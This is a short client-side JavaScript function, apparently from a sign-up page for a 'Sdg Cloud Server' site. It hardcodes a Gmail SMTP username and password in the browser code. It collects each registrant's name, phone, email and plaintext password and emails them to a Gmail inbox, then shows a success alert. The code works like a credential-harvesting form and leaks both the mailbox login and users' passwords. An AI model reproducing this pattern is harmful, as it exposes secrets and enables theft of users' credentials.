function sendEmail()
{
    Email.send({
        Host : "smtp.gmail.com",
        Username : "help.sdgcloudserver@gmail.com",
        Password : "sdgcloudserver",
        To : 'sdgcloudserver@gmail.com',
        From : document.getElementById("email").value,
        // From : 'support@sdgcloudserver.com',
        Subject : "New User Registered In Sdg Cloud Server!",
        Body : "Name: "+document.getElementById("name").value+"<br> Phone No: "+document.getElementById("mobile").value+"<br> Email: "+document.getElementById("email").value+"<br> Password: "+document.getElementById("password").value
    }).then(
      message => alert("Congratualations! Your Profile Has Been Successfully Registered With Us! Now You Can Access All Our Files!")
    );
}